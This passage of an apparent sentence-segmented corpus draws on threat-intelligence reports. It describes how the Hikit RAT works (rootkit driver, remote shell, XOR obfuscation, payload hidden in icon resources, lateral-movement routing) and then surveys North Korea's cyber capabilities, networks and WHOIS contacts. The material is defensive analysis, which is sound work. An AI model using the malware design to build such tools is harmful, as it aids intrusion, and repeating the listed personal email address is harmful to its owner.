2003 blog post .", "3661": "The Driver is a relatively straightforward piece of software .", "3662": "The Driver is based primarily on the open source Agony rootkit and it has evidence of some portions of the code coming directly from a Chinese blog .", "3663": "For reasons unknown , the authors of the Driver used code from a Chinese blog that details how to hide network connections on Windows Vista and later decided to keep the example IP address within the code .", "3664": "Gen 2.0 introduced a single command to provide insight into an infected machine 's Hikit configuration ( something that is not necessary for Gen 1 variants since they are server-based ) .", "3665": "The remote shell function uses the standard pipe redirection method for interfacing a network application ( in this case , the DLL ) to a hidden command shell .", "3666": "The connect function provides the functionality to allow one Hikit DLL to interface with another DLL of a similar version .", "3667": "The use of this functionality can best be illustrated by considering the fact that the Gen 1 Driver requires an exposed network interface in order for an external attacker to access the Gen 1 's RAT function .", "3668": "This would prohibit lateral movement within a victim 's network as the bulk of any organization 's network infrastructure is not directly exposed to the Internet .", "3669": "By using the connect command , an attacker can instruct the externally exposed Gen 1 DLL to route traffic to a Gen 1 DLL that is behind the firewall , effectively making the externally exposed Gen 1 DLL a local router for Hikit traffic .", "3670": "This information is important for the attacker to have access to in order to determine if any aspect of the configuration is out of date ( thus requiring a new variant of the Gen 2 binary to be configured and deployed ) .", "3671": "The information command returns to the attacker the complete configuration and current state of the Gen 2 malware .", "3672": "As the name implies , the exit command causes the DLL to discontinue the current connection .", "3673": "With the Gen 1 sub-family using a server model and the Gen 2 sub-family using the client model , understanding how each of the DLL components of the sub-families works is best done , as with the Driver above , in the context of the specific sub-family .", "3674": "As noted previously in this report , the Gen 1 sub-family has several sub-generations but overall the functionality of the Gen 1 sub-family has remained constant .", "3675": "With the exception of Gen 1.0 , the functionality of Gen 1 comes from the DLL component ( Gen 1.0 uses a stand-alone executable to achieve the same results ) .", "3676": "The DLL contains only two exports : DllEntryPoint and DllRegisterServer .", "3677": "The authors of Gen 1 used freely available source code found online for their removal function .", "3678": "This requires sending OID 0x12C850 to the Driver and comparing the resulting 32-bit value with the required driver version .", "3679": "If the version is incorrect ( i.e .", "3680": "The DLL again checks the version of the Driver and , in some versions of the DLL , will print a message indicating the version of the Driver installed and report the '' Transate version '' ( the word translate is misspelled within the binary ) .", "3681": "It appears that the Driver and the communication protocol version do not necessarily have to match exactly , allowing the possibility that the Driver and the DLL could be compiled at separate times .", "3682": "If the Driver version is less than the '' Transate '' version ( indicating that the Driver is a version too old to support the necessary communication protocols ) , the DLL will , in some version of the DLL , print out a line to the screen indicating the DRIVERMINVERSION required along with the current Driver version .", "3683": "It is unclear why this code exists given that the DLL will check the Driver version and correct the Driver if necessary prior to reaching the portion of the code that reports the DRIVERMINVERSION .", "3684": "The DLL enters an infinite loop where the DLL waits for the Driver to report a new channel exists .", "3685": "A channel represents an established connection between the Driver and an external party that has provided the proper initial request and , for Gen 1.2 variants , provided the proper authentication value .", "3686": "This allows the DLL to service multiple channels at one time .", "3687": "The HikitThreadFunc function is , at its core , a simple wait and respond loop .", "3688": "The function begins by transmitting a Hikit command prompt to the client ( Hikit > ) before settling into an infinite loop of The communication scheme between the DLL and the client consists of a 20 to 24 byte header ( for Gen 1.0 and Gen 1.1 ) or a 28 byte header ( for Gen 1.2 ) followed by an optional payload .", "3689": "The format of the Gen 1.0 and Gen 1.1 header is as follows : While the Gen 1.2 header is : For Gen 1.0 and Gen 1.1 samples , the magic field contains the string '' ..", "3690": "..", "3691": "'' ( two dots followed by a space then two more dots ) .", "3692": "Whereas the key field in Gen 1.2 samples contains a 32-bit value that represents the XOR key for the remainder of the PacketHeader and any additional payload data .", "3693": "The XOR scheme works on 32-bit chunks of data where each 32-bit chunk of data is XOR 'd against the key value .", "3694": "Version checking is important in all Gen 1 variants .", "3695": "Gen 1 samples have a particular interest in the victim 's locale language preferences .", "3696": "While it is typical for most RATs that provide remote shells to simply pass data unfiltered from client to server and server to client without regard to code pages , Gen 1 samples take special care to record the code page and locale information in each and every packet header that traverses the divide between client and server and server and client .", "3697": "This could indicate that the authors of Gen 1 understood from an early stage in the development of Gen 1 that they would be attacking computer systems with different locales and code pages .", "3698": "The Loader comes in the form of a standard executable image or a DLL image .", "3699": "The only difference between the executable and DLL versions of the Loader comes in how they handle the initialization of the embedded DLL .", "3700": "Figure 1 provides a side by side comparison of the startup routines for the executable and DLL Loaders .", "3701": "The function LoadEmbeddedImage , as seen in part in Figure 2 , is responsible for this operation .", "3702": "The Loader obfuscates many strings by using a simple XOR encoding scheme .", "3703": "Decryption of encoded strings consists of taking the first value of the string as the XOR key , XOR'ing all subsequent bytes until the result of the XOR returns 0 .", "3704": "The decoding of the encoded strings is handled by the DecodeString function .", "3705": "The Loader stores the embedded DLL within a Group Icon resource within a legitimate icon image .", "3706": "In order to locate the embedded DLL , LoadEmbeddedImage will use the DecodeString function to decrypt the delimiter string ( which is typically zzzzzzzzzz or yyyyyyyyyy ) and then search the icon's resource memory for the delimiter string .", "3707": "Once located , LoadEmbeddedImage will use the first 12 bytes immediately after the string as the information structure about the embedded DLL .", "3708": "The structure ( seen below ) defines the size of the embedded DLL within the icon 's resource memory , the size of the DLL after it is decompressed and a 4-byte XOR key that LoadEmbeddedImage must use to decode the embedded DLL prior to decompression .", "3709": "Another heap buffer is allocated with a size equal to the value of dwImageSizeDecompressed .", "3710": "The decompression buffer along with the now decoded compressed buffer are given to lzodecompress which decompresses the compressed image using the LZO1X algorithm .", "3711": "The Gen 2 DLL exposes five exported functions ( besides the DllEntryPoint/DllMain ) .", "3712": "MatrixMain , however , has added functionality .", "3713": "'' Network DDE Service '' ) and assign itself as the executable for the service .", "3714": "Each communication burst ( either between the malware and the C2 or the malware and neighboring malware ) begins with a 24-byte header identical to the header found in Gen 1.2 .", "3715": "Immediately following the header is the type-specific ( as indicated by the dwPayloadType field ) payload data .", "3716": "Note that the dwXORKey value is NOT encoded with the XOR value , but rather is the value that is used for encoding the header and payload .", "3717": "Each DLL includes a hardcoded , default configuration .", "3718": "At the time that the RAT functionality activates , the DLL will drop the current configuration to disk .", "3719": "If the configuration file already exists , then the RAT will use the file version of the configuration over the default configuration .", "3720": "The configuration data structure ( seen below ) doubles as a current state record for some aspects of the communication subsystem of the DLL .", "3721": "When stored on disk , the configuration is preceded by a GUID value ( 16 bytes ) that represents the unique identifier for the specific infection .", "3722": "The configuration is XOR encoded using the first 4 bytes ( as a DWORD ) of the GUID .", "3723": "The DLL contains a device driver image embedded within an encoded buffer which the RAT functionality code will extract to the % TEMP % directory ( after XOR'ing the buffer with 0x76 ) .", "3724": "\\Globals\\HTTPS ) .", "3725": "In addition to the main Hikit malware , there are at least two examples of support programs that belong to the Hikit family .", "3726": "Samples b04de6c417b6f8836e3f2d8822be2e68f4f9722b and 7c4da9deff3e5c7611b9e1bd67d0e74aa7d2d0f6 are examples of Gen 1.0 and Gen 1.2 operator consoles .", "3727": "Detecting Hikit variants on disk and in memory is possible using the following YARA signature developed by Symantec : Detecting nominal Gen 1.2 and later network activity is problematic given the nature of the communication structure .", "3728": "The encrypted nature of the nominal Gen 1.2 and later network traffic makes a signature difficult .", "3729": "Snort signature 30948 may detect some Hikit based network traffic for only Gen 1.0 and Gen 1.1 .", "3730": "The event names change per infection , but have a common format .", "3731": "The following three strings represent the known mutex strings for Gen 2 samples : where the % s format variable is replaced with a UUID value string specific to the infected machine.", "3732": "Thank you for subscribing to Episode 16 of the HP Security Briefing .", "3733": "In this edition we discuss the cyber landscape within the Democratic People's Republic of Korea .", "3734": "The Democratic People 's Republic of Korea ( DPRK ) , known in the West as North Korea , is a unique country with a military-focused society and an unconventional technology infrastructure .", "3735": "While North Korea was formerly on the U.S. list of state sponsors of terrorism , it was removed in 2008 .", "3736": "However , due to North Korea 's hostility toward other nations , its pursuit of nuclear weapons , and human rights violations against its own citizens , the United Nations and many Western entities have placed sanctions and embargoes against North Korea .", "3737": "For example , U.S. export laws forbid the sale of dual-use technologies , or those that can be used or repurposed for both civilian and military use , to North Korea .", "3738": "< /n > 5 < /fn > Additionally , the U.S. has a military alliance with the Republic of Korea ( ROK ) , known in the West as South Korea , North Korea 's primary target of conflict .", "3739": "Due to North Korea 's global interactions , its cyber warfare capabilities are of particular interest to the U.S .", "3740": "According to a 2009 report by Major Steve Sin , an intelligence analyst at U.S .", "3741": "Forces Korea , North Korean hackers have successfully penetrated U.S. defense networks more frequently than any other country that has targeted U.S. defense assets .", "3742": "While Major Sin may have been overly optimistic about North Korea 's abilities , it is clear that they should not be underestimated .", "3743": "Frank Cilluffo , co-director of the Cyber Center for National and Economic Security at George Washington University , testified before Congress that North Korea 's cyber capability '' poses an important 'wild card ' threat , not only to the United States but also to the region and broader international stability\u2026 '' In an April 2014 testimony given to the House Armed Services Committee , General Curtis M. Scaparrotti noted that '' North Korea remains a significant threat to United States ' interests , the security of South Korea , and the international community due to its willingness to use force , its continued development and proliferation of nuclear weapon and long- range ballistic missile programs , and its abuse of its citizens ' human rights , as well as the legitimate interests of its neighbors and the international community .", "3744": "'' Scaparrotti stressed that '' While North Korea 's massive conventional forces have been declining due to aging and lack of resources\u2026North Korea is emphasizing the development of its asymmetric capabilities .", "3745": "North Korea 's asymmetric arsenal includes\u2026an active cyber warfare capability .", "3746": "'' While one would expect the regime 's digital infrastructure to also suffer from aging or lack of resources , these factors do not take away from their technical abilities to wage cyber warfare .", "3747": "While the U.S. views North Korea 's cyber warfare program as the regime 's foray into modern asymmetrical warfare , South Korea views the regime 's cyber capabilities as a terroristic threat , -a build-up for an impending multifaceted attack .", "3748": "It is important to note that , to date , no such attack has occurred .", "3749": "According to a report written by Captain Duk-Ki Kim , Republic of Korea Navy officer and Ph.D. '' \u2026the North Korean regime will first conduct a simultaneous and multifarious cyber offensive on the Republic of Korea 's society and basic infrastructure , government agencies , and major military command centers while at the same time suppressing the ROK government and its domestic allies and supporters with nuclear weapons .", "3750": "'' South Korea 's view of North Korea as a terroristic threat may be an attempt to downgrade North Korea politically , since South Korea does not recognize the regime as a legitimate state .", "3751": "South Korean reports also claim that North Korea 's premier hacking unit , Unit 121 , trails Russia and the U.S. as the world 's third largest cyber unit .", "3752": "While this claim may be exaggerated , in 2012 , South Korean reports estimated North Korea 's hacker forces at around 3000 personnel .", "3753": "In a July 2014 report from South Korea 's Yonhap News Agency , that figure was upgraded to 5900 hacker elite .", "3754": "We must stress that although these claims have not been corroborated , South Korea has taken the regime 's cyber threats very seriously and is reportedly training 5000 personnel to defend against North Korean cyber attacks .", "3755": "Obtaining details on North Korea 's cyber warfare capabilities is not an easy task .", "3756": "This paper will examine the known cyber capabilities of North Korea 's regime and how the country maintains secrecy in these matters .", "3757": "Through information obtained via open source intelligence ( OSINT ) , we will present what is known about North Korea 's cyber warfare and supporting intelligence and psychological operations capabilities .", "3758": "The following conditions proved to be research roadblocks when gathering intelligence regarding North Korea 's cyber warfare capabilities : \uf0b7 Much of the intelligence available on North Korea is dated and may not accurately reflect the regime 's current capabilities .", "3759": "\uf0b7 Much of the intelligence available on North Korea comes from U.S. or South Korean military or agency reports .", "3760": "These reports omit details that are likely classified , such as specific IP addresses and individual actor information .", "3761": "\uf0b7 While South Korea is an ally of the United States , its reports on North Korean cyber activity potentially contain incomplete or biased information .", "3762": "Cultural factors that stem from a history of tension and conflict between the two nations may skew perception and make objectivity difficult .", "3763": "\uf0b7 North Korea 's Internet infrastructure and the regime 's strict control over its use ensures that there are no rogue actors and that all officially sanctioned actors exercise careful OPSEC and PERSEC practices in order to prevent inadvertent information leaks .", "3764": "In other words , there was no significant identifying information in the form of an OSINT trail left behind by the actors .", "3765": "This hinders collection of original , actionable threat intelligence and individual actor attribution .", "3766": "\uf0b7 North Korea is well-isolated from the outside world , and its strong intelligence and psychological operations presence effectively creates confusion via counterintelligence and disinformation about the regime 's capabilities .", "3767": "For this reason , any '' official '' reports emanating from North Korea must be taken with a grain of salt .", "3768": "This also hinders attempts to obtain original , actionable threat intelligence .", "3769": "In order for Westerners to understand the North Korean mindset , it is necessary to examine the key components of North Korean political and ideological thought .", "3770": "It is also necessary to provide a brief explanation of how North Korea and South Korea view one another , in order to understand the basis for conflict between the two .", "3771": "North Korea has two primary ideologies that provide context for the regime 's motivations and activities : juche ( ju-cheh ) and songun ( sun-goon ) .", "3772": "Juche is the official political ideology of North Korea .", "3773": "It was instituted in 1972 and is based on the ideologies of Kim Il-Sung , the founder of the DPRK .", "3774": "Juche emphasizes self-reliance , mastering revolution and reconstruction in one 's own country , being independent of others , displaying one 's strengths , defending oneself , and taking responsibility for solving one 's own problems .", "3775": "North Korea 's air-gapped intranet , described below , exemplifies this philosophy in the country 's cyber infrastructure .", "3776": "The juche philosophy explains North Korea 's disdain for outside cultural and political influence .", "3777": "Juche challenges North Koreans to contribute to the regime 's chaju ( ja-ju ) , a concept of national sovereignty and independence .", "3778": "The regime 's greatest fear is internal dissent and resulting destabilization .", "3779": "In a June 2014 Reddit AMA session , Dr. Andrei Lankov , an expert on North Korean culture and society , noted '' there are also serious signs of public alienation and discontent .", "3780": "And I can not rule out a public outbreak of such discontent in the near future .", "3781": "Of course , if it happens , it will have a serious impact on the government .", "3782": "'' Despite North Korea 's strong conviction in juche , the regime collaborates with and receives support from other nations .", "3783": "However , due to this deep-seated ideology , it is doubtful that North Korea fully trusts these apparent allies .", "3784": "Later in this document , we will show that North Korea relies heavily on China for Internet access .", "3785": "North Korea also collaborates with China and Russia to train its cyber warriors and has longstanding political and military relationships with several nations .", "3786": "Songun is North Korea 's '' military first '' doctrine .", "3787": "Songun emphasizes the priority of the military in resource allocation and political and economic affairs .", "3788": "This doctrine stems from the belief that the military is vital for preservation of chaju .", "3789": "Understanding songun mindset gives context for this potential threat actor 's motivations .", "3790": "According to a 2013 Congressional report , the strategy established under former leader Kim Jong-Il focused on '' internal security , coercive diplomacy to compel acceptance of its diplomatic , economic and security interests , development of strategic military capabilities to deter external attack , and challenging South Korea and the U.S.-South Korean alliance .", "3791": "'' North Korea 's songun permeates the lives of all North Korean citizens .", "3792": "Article 58 of the North Korean Constitution states that the nation should base itself on a nationwide defense system that includes all people .", "3793": "North Korea , with a population of 25 million , has an active duty force of 1.19 million personnel , the fourth largest in the world .", "3794": "The country 's reserve and paramilitary units comprise 7.7 million additional personnel .", "3795": "In other words , over a third of the country's population serves in a military or paramilitary capacity .", "3796": "Some North Korean youth aged 7-13 are inducted into the Korean Children 's Union .", "3797": "The Korean Children 's Union is responsible for indoctrinating youths who pledge to build up their strength to later defend the regime .", "3798": "Children aged 14-16 can begin military training as members of the Young Red Guards , a paramilitary unit .", "3799": "Beginning at age 17 , North Koreans are eligible to join the Reserve Military Training Unit .", "3800": "The Reserve Military Training Unit forms the core of North Korea 's reserves and is typically assigned to the front or regional defense in wartime .", "3801": "The youngest age at which a citizen can be conscripted for active duty is unclear ; reported ages range from 18-20 .", "3802": "Youths can volunteer for active duty service at age 16 or 17 .", "3803": "The Worker-Peasant Militia , or Red Guards , includes males ages 17-60 and unmarried females ages 17-30 who are not part of active duty units or the Reserve Military Training Unit .", "3804": "The regime has an impressive number of conventional weapons , considering the nation 's small land area and population size .", "3805": "According to statistics released by CNN in 2014 , North Korea's ground arsenal includes 4100 tanks , 2100 armored vehicles , and 8500 pieces of field artillery .", "3806": "The regime 's sea weaponry includes 70 submarines , 420 patrol combatants , and 260 amphibious landing craft .", "3807": "Their airpower includes 730 combat aircraft , 300 helicopters , and 290 transport aircraft .", "3808": "While the limits of the regime 's ballistic missile program are unknown , North Korea is thought to have fewer than 100 short-range missiles and fewer than 100 medium to long-range missiles .", "3809": "However , in recent years , North Korea has suffered oil , fuel , electricity , and food shortages .", "3810": "Without aid from another entity , the regime does not have sufficient resources to maintain and sustain the majority of its weapons and associated personnel for rapid deployment or prolonged combat .", "3811": "Tension between North and South Korea has continued well past the armistice meant to end the Korean War .", "3812": "Neither nation recognizes the other as a legitimate state .", "3813": "South Korea 's constitution legally defines South Korean territory as the entire Korean peninsula and its adjacent islands , with '' North Korea '' being a part of South Korea .", "3814": "North Korea also claims to be the sole government of the Korean Peninsula .", "3815": "Each country 's claim of sovereignty and refusal to acknowledge the other as a legitimate state creates the condition for perpetual conflict .", "3816": "North Korea 's negative sentiment towards the U.S. stems from two major factors : the U.S. \u2013 South Korea military alliance and North Korea 's perception that the U.S. is imperialistic and prone to exploitative capitalism .", "3817": "In recent years , two primary factors have heavily influenced the current state of North Korea's relations with South Korea and her allies : the rise of the regime 's leader Kim Jong Un and the inauguration of South Korean president Park Guen Hye .", "3818": "Kim Jong Un officially rose to power in April 2012 , following the death of his father Kim Jong Il in December 2011 .", "3819": "While his age remained a mystery for quite some time , it was later revealed that he was born in January 1983 , making him age 31 at present .", "3820": "This makes Kim Jong Un the world 's youngest leader of an established nation .", "3821": "The young leader 's rise to power brought about several changes in North Korea .", "3822": "First , Kim Jong Un 's personal life is more public and more extravagant than that of his father .", "3823": "Unlike his father , the young Kim is often accompanied by his wife when making public appearances .", "3824": "Second , the young Kim , who is more high-tech than his predecessor , is reported to have an affinity for luxury items and is an avid gamer and basketball fan .", "3825": "Third , Kim Jong Un is more totalitarian than his father .", "3826": "Following his rise to power , the regime reportedly expanded its labor camps , and more military resources were allocated to target those attempting to defect .", "3827": "Kim also executed his own uncle , a high-ranking official who did not share his ideals .", "3828": "These moves indicate the regime 's priority to deter internal destabilization and dissent , which is perceived to be a greater threat than outside adversity .", "3829": "According to Phil Robertson , deputy Asia director at Human Rights Watch , '' The government now recognizes that the accounts of escaping North Koreans reveal Pyongyang 's crimes \u2013 so it is doing what it can to stop people from fleeing .", "3830": "'' Under Kim Jong Un 's rule , the regime has stepped up its nuclear materials production , and the propaganda distributed by state media has become more menacing .", "3831": "The regime 's response to perceived threats has also become more volatile .", "3832": "Christian Whiton , a former deputy envoy to North Korea , noted that following Kim Jong Un 's rise to power , '' the regime still acts in a very belligerent manner , but it seems less predictable , and more random .", "3833": "'' Ellen Kim , assistant director of the Korea Chair at the Center for Strategic and International Studies , assessed the situation thusly : '' Since [ Kim Jong Un ] took power he has purged almost all of his elder guardians ...", "3834": "and filled his surroundings with new faces .", "3835": "We are in a situation where we are learning about him a little bit every day through his unpredictable behavior and actions , which is why the current situation with North Korea is a lot more dangerous than before .", "3836": "'' The regime's recent reaction to an upcoming film supports these statements .", "3837": "The plot for the comedy film '' The Interview '' follows two talk show hosts who are asked to assassinate Kim Jong Un .", "3838": "The regime even sent a complaint about the movie to the UN .", "3839": "In response to the film , a North Korean official stated , '' The enemies have gone beyond the tolerance limit in their despicable moves to dare hurt the dignity of the supreme leadership .", "3840": "'' The official referred to the movie as '' the most undisguised terrorism and a war action to deprive the service personnel and people of the DPRK of their mental mainstay and bring down its social system .", "3841": "'' The official also issued a threat : '' If the U.S. administration connives at and patronizes the screening of the film , it will invite a strong and merciless countermeasure .", "3842": "'' This reaction demonstrates North Korea 's priority of preserving the regime 's self-perceived dignity in the global arena and its intolerance of any disrespect directed at the Kim family .", "3843": "While tensions between North and South Korea have persisted since the Korean War , these tensions escalated following the 2013 inauguration of South Korea 's current president , Park Geun Hye .", "3844": "Her platform , in her words , is as follows : '' North Korea must keep its agreements made with South Korea and the international community to establish a minimum level of trust , and second there must be assured consequences for actions that breach the peace .", "3845": "To ensure stability , trustpolitik should be applied consistently from issue to issue based on verifiable actions , and steps should not be taken for mere political expediency .", "3846": "'' Shortly after Park 's inauguration , North Korea denounced UN Security Council Resolution 2094 , which is '' a resolution strengthening and expanding the scope of United Nations sanctions against the Democratic People 's Republic of Korea by targeting the illicit activities of diplomatic personnel , transfers of bulk cash , and the country 's banking relationships , in response to that country 's third nuclear test on 12 February [ 2013 ] .", "3847": "'' North Korea also responded strongly to joint U.S.-South Korea military exercises in March 2013 , as is noted later in this paper .", "3848": "North Korea 's cyber infrastructure is divided into two major parts : an outward-facing Internet connection and a regime-controlled intranet .", "3849": "North Korea 's outward-facing Internet connection is only available to select individuals and is closely monitored for any activity that is deemed anti- regime .", "3850": "Individuals using the outward-facing Internet connection must be authorized .", "3851": "In 2013 , Jean H. Lee , the Associated Press bureau chief in Pyongyang , stated that foreigners visiting North Korea are allowed Internet access with no firewalls .", "3852": "Common citizens are limited to using the Kwangmyong ( gwang me-young ) , a nationwide intranet with no access to the world outside North Korea .", "3853": "According to Lee , Kwangmyong allows citizens '' access to the state media , information sources that are vetted by the government , and picked and pulled from the Internet and posted to their intranet site .", "3854": "'' As of May 2013 , North Korea had only one '' Internet caf\u00e9 .", "3855": "'' A 2003 report from the Office of the National Counterintelligence Executive stated that North Korea 's '' Internet caf\u00e9 '' was '' the only place in North Korea for the public to access the Internet '' and that foreigners were allowed to access the Internet from this caf\u00e9 .", "3856": "Whether citizens are allowed to access the Internet from this location is unknown .", "3857": "Star Joint Venture Co. is responsible for providing North Korea 's Internet access .", "3858": "Star Joint Venture Co. was established by the Post and Telecommunications Corporation in cooperation with Loxley Pacific in Thailand .", "3859": "In December 2009 , Star Joint Venture became responsible for North Korea's Internet address allocation .", "3860": "Previously , Internet access was provided by a German satellite link via Korea Computer Center Europe or via direct connections with China Netcom , which was later merged into China Unicom .", "3861": "By October 2010 , North Korea had made its first known direct connection to the Internet , hosting an outward-facing Korean Central News Agency website accessible from the global Internet .", "3862": "However , many of North Korea 's globally accessible websites are hosted in other countries .", "3863": "In 2001 , South Korean reports indicated that North Korea had joined the International Telecommunications Satellite Organization ( INTELSAT ) .", "3864": "As of April 2012 , North Korea reportedly used the Intelsat connection , which appeared in border gateway protocol ( BGP ) announcements .", "3865": "Some reports referred to the Intelsat connection as North Korea 's backup Internet connection , in case the China Unicom connection fails .", "3866": "A March 2013 post on the blog rdns.im showed that North Korea no longer used the Intelsat connection .", "3867": "In the blog post , the author noted his method for proving that The Pirate Bay was not hosted in North Korea .", "3868": "While his analysis of The Pirate Bay 's hosting is irrelevant to our research , he did detail that 175.45.177.0/24 always routes through AS4837 , and AS131279 .", "3869": "AS131279 is Star-KP , North Korea 's Star Joint Venture Company , and AS4837 is China Unicom .", "3870": "The author concluded that '' all [ traffic ] is ONLY routed through China Unicom and NOT through Intelsat .", "3871": "'' In February 2014 , North Korean and South Korean officials agreed to extend Internet access to Kaesong Industrial Zone , a jointly operated industrial complex just north of the border .", "3872": "However , this would likely require a major electrical and network infrastructure expansion .", "3873": "North Korea 's electrical grid can not support a large technological infrastructure .", "3874": "Electrical power is reported to be unreliable and sporadic , with many citizens only receiving a few hours of electricity per day .", "3875": "The photo above ( Figure 3 ) , from the International Space Station , shows North Korea 's sparse power grid , in comparison with surrounding nations .", "3876": "We have highlighted North Korea in red .", "3877": "Koryolink , the country 's only cellular phone network , is tightly controlled by the regime .", "3878": "Cell phone data plans are not available to most users .", "3879": "Most cellular phones can not access the Internet and can only make domestic calls .", "3880": "According to a 2013 report , North Korea has a 3G data network for cellular phones .", "3881": "Visiting reporter Jean H. Lee purportedly used this 3G network to post to both Twitter and Instagram .", "3882": "However , citizens are not generally allowed to use the 3G network .", "3883": "Email is also regulated by the regime .", "3884": "The first email provider in North Korea was Silibank .", "3885": "Silibank has servers in Pyongyong and Shenyang and is a joint venture with China .", "3886": "The North Korean Silibank homepage is silibank.net , and the Chinese homepage is silibank.com .", "3887": "In order to use the email service , users had to initially register , provide personal information , and pay a registration fee and monthly service fees .", "3888": "This registration information was current as of 2001 .", "3889": "However , it is unknown whether the same process still applies .", "3890": "WHOIS records for silibank.net show that the site was registered anonymously via a Japanese registrar .", "3891": "This information can be found in Appendix A at the end of this paper .", "3892": "Korea Computer Center ( KCC ) is North Korea 's leading government research center for information technology .", "3893": "KCC has eleven regional information centers and eight development and production centers .", "3894": "Other countries with KCC branch offices include China , Syria , Germany , and United Arab Emirates .", "3895": "KCC has a vested interest in Linux research and is responsible for the development of North Korea 's national operating system , Red Star OS , which is discussed in more detail below .", "3896": "KCC 's other projects have included a proprietary search engine , a document writer , a game called Jang-Gi , the Kwangmyong intranet , a food study program , a Korean input method editor , a pen-based English-Korean and Korean-English translator , Korean voice recognition software , a video conferencing system , a distance education system , SilverStar Paduk software , HMS Player , and the Samjiyon tablet .", "3897": "In addition to research and development , KCC also monitors websites of foreign government and business entities and conducts technical reconnaissance to blueprint the technical specifications and vulnerabilities in foreign systems and technologies .", "3898": "KCC has also been involved in clandestine information and cyber operations , serving as a command center .", "3899": "North Korea 's proprietary operating system is Red Star OS .", "3900": "The development of this Linux-based operating system started in 2002 .", "3901": "Red Star OS is only offered in the Korean language and features proprietary software including Naenara ( a Firefox-based browser ) , as well as a text editor , email client , audio and video players , and games .", "3902": "Red Star OS 's keyboard layouts include Korean , English , Russian , Chinese , and Japanese .", "3903": "Regime ideals extend to Red Star OS .", "3904": "The readme file , which goes with the installation disc , reportedly includes a quote from Kim Jong-Il regarding the importance of North Korea having its own Linux-based operating system that is compatible with Korean traditions .", "3905": "While prior versions of Red Star were KDE-based , version 3.0 mimics Apple 's OS X .", "3906": "This could indicate the regime leader Kim Jong Un 's preference for the OS X environment , as Kim reportedly uses an iMac .", "3907": "Citizens do not need permission to obtain Red Star OS .", "3908": "However , the purchase of computers is heavily regulated .", "3909": "The OS 's design suggests it was developed with means for the regime to monitor user activity .", "3910": "North Korea is known to use two IP ranges .", "3911": "175.45.176.0/22 is North Korea 's own IP block .", "3912": "Additionally , North Korea 's Telecommunications Ministry is the registered user of China Unicom IP range 210.52.109.0/24 .", "3913": "The country 's only autonomous system ( AS ) number is AS131279 , and its only peer is AS4837 , the AS for China Unicom .", "3914": "North Korea 's country code top-level domain ( ccTLD ) is .kp", "3915": ".", "3916": "In 2007 , the .kp", "3917": "TLD was initially delegated to and administered by the German-based KCC Europe .", "3918": "After KCC Europe failed to maintain the TLD , it was re-delegated to Star Joint Venture Company .", "3919": "The .kp", "3920": "TLD uses the following nameservers and IP addresses : Various U.S. , U.N , and other sanctions prohibit export of dual-use technologies to North Korea .", "3921": "In light of this , North Korea has managed to develop both hardware and software and hosts an annual National Exhibition of Invention and New Technologies to promote its products .", "3922": "However , the regime has historically failed in its attempts at large-scale production of electronic components .", "3923": "The country 's sparse electrical grid is one of the major obstacles hindering large- scale manufacturing .", "3924": "Additionally , the famine in the early 1990 's negatively impacted existing manufacturing facilities , and the regime simply does not have the capital to modernize those factories .", "3925": "A member of the World International Property Organization ( WIPO ) , North Korea joined the WIPO Patent Cooperation Treaty that protects patents and trademarks worldwide , and leverages intellectual property laws to ensure Westerners do not take credit for North Korean inventions .", "3926": "The regime , in its efforts to isolate its citizens from Western influence , leverages intellectual property laws to ensure Westerners do not take credit for North Korean inventions .", "3927": "This is ironic since foreign-made electronic components are sometimes smuggled into North Korea for military use and for personal use by the regime 's upper echelon .", "3928": "A comparison of a scan of North Korea 's IP ranges in November 2010 , just one month after North Korea made its first direct connection to the Internet , and a series of several scans we conducted in May 2014 , shows that North Korea has made significant headway in establishing its Internet presence .", "3929": "In the November 2010 scan , 175.45.176.0 - 175.45.176.16 showed a variety of devices including D-link , Cisco , Linksys , HP , and Nokia devices , and a Juniper networks firewall .", "3930": "Operating systems detected included FreeBSD 6.x , Linux 2.6.x , and Red Hat Enterprise Linux .", "3931": "175.45.176.14 returned '' Naenara '' as an html-title .", "3932": "Most hosts in the 175.45.176.xx and 175.45.177.xx ranges were down .", "3933": "As of 2014 , IP addresses 175.45.176.0 - 175.45.177.255 appear to be used for websites , nameservers , databases , email , and voice over IP ( VoIP ) .", "3934": "In November 2010 , the 175.45.178.xx range showed all hosts down , and the 175.45.179.xx range showed most hosts were down .", "3935": "In 2014 , several webservers and nameservers were found in the 175.45.178.xx range , and several nameservers and mail servers were found in the 175.45.179.xx range .", "3936": "This comparison demonstrates that there has been some growth in DPRK Internet infrastructure over the past four years .", "3937": "However , it seemingly lags behind even most third world nations .", "3938": "The 2014 scans detected dated technology that is potentially susceptible to multiple vulnerabilities and consistently showed the same open ports and active devices on scanned hosts .", "3939": "It is not clear whether the regime failed to notice and react to the scanning or whether the regime allows these open ports and devices to be detected or spoofed to serve as a distraction or possible honeypot .", "3940": "Domains , nameservers , and mail servers present during the May 2014 scan are listed in Appendix B at the end of this report .", "3941": "According to Alexa rankings , the three most visited websites in North Korea are kcna.kp , the official website of the Korean Central News Agency ( KCNA ) ; rodong.rep.kp , another North Korean news site ; and naenara.com.kp , North Korea 's official web portal .", "3942": "Naenara translates to '' my country '' .", "3943": "The kcna.kp site was registered using a Loxley.co.th email address and is administrated by Star Joint Venture Company .", "3944": "The WHOIS Record can be found in Appendix A. Rodong.rep.kp was registered using the same loxley.co.th email address and is also administered by Star Joint Venture Company .", "3945": "The WHOIS Record for this site can be found in Appendix A .", "3946": "The WHOIS information for Naenara.com.kp was not available .", "3947": "In March 2013 , there were reports that the Chrome browser was blocking Naenara.com.kp due to malware .", "3948": "It is difficult to say whether this incident is a case of North Korea serving malware or whether a third party took advantage of an improperly secured website .", "3949": "Several major North Korean websites are hosted outside of North Korea .", "3950": "The popular Uriminzokkiri.com website , whose name translates to '' our nation , '' is hosted in China .", "3951": "The administrative contact for the website is Kim Sejun , and the email address given as contact information is hyk1979 @ hotmail.com .", "3952": "The WHOIS Record for this site can be found in Appendix A .", "3953": "The website for Kim Il Sung Open University , otherwise known as '' Our Nation School '' is also hosted in China .", "3954": "The WHOIS record for this site can be found in Appendix A .", "3955": "At the top of North Korea 's military structure is the National Defense Commission ( NDC ) .", "3956": "The NDC is also the highest branch of government and the regime 's supreme policymaking body .", "3957": "Along with the Central Committee of the Workers ' Party of Korea and the Cabinet , NDC is at the top of North Korea 's political hierarchy .", "3958": "Article 106 of North Korea 's Constitution gives the NDC the following powers : \uf0b7 The power to establish policies of the state in accordance with the military-first revolutionary line .", "3959": "\uf0b7 The power to guide the armed forces and oversee defense building .", "3960": "\uf0b7 The power to supervise and ensure the NDC and its chairman 's orders are executed and to establish necessary measures .", "3961": "\uf0b7 The power to override any state decisions or directives that are in opposition 